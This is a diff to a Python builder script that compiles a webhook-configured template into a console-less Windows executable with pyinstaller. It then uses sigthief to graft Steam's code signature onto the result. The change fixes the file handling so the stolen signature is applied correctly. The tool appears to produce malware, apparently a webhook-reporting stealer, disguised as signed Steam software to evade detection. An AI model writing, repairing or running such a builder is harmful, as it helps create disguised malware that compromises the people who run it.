@@ -80,23 +80,23 @@ def builder(webhook, output, debugging):
         f.write(template)
     
     print(f"[{Fore.CYAN}*{Fore.RESET}] Converting to exe...")
-    
+
     if debugging:
         os.system("pyinstaller --onefile "+launcherpy)
     else:
         os.system("pyinstaller --onefile --noconsole "+launcherpy)
-    
+
     print(f"[{Fore.CYAN}*{Fore.RESET}] Clearing...")
-    
+
     os.remove(launcherpy)
-    shutil.move(os.path.join("dist", output+".exe"), ".")
+    shutil.move(os.path.join("dist", output+".exe"), os.path.join(".", output+".exe.old"))
 
     shutil.rmtree("build")
     shutil.rmtree("dist")
     os.remove(output+".spec")
 
     print(f"[{Fore.RED}!{Fore.RESET}] Adding codesign to exe...")
-    os.system(f"python tools/sigthief.py -t {output}.exe -i bin_sign/steam.exe -o {output}.exe")
+    os.system(f"python tools/sigthief.py -t {output}.exe.old -i bin_sign/steam.exe -o {output}.exe")
 
 if __name__ == "__main__":
     builder()
